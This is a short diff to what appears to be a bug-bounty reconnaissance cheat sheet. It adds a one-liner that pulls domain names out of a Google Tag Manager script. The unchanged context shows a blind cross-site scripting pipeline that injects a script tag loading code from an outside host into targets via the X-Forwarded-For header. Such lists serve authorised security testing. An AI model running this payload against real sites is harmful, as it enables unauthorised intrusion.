@@ -339,3 +339,12 @@ xargs -a alive.txt -I@ sh -c 'gau --blacklist css,jpg,jpeg,JPEG,ott,svg,js,ttf,p
 ```
 findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# Subdomain Enumeration with Google Tag Manager.
+
+## OneLiner
+```
+curl -s "https://www.googletagmanager.com/gtm.js?id=[TARGET-GTM-ID]" | grep -oP '"key","[a-zA-Z0-9.-]+\.[a-z]{2,}"' | awk -F'"' '{print $4}'
+```
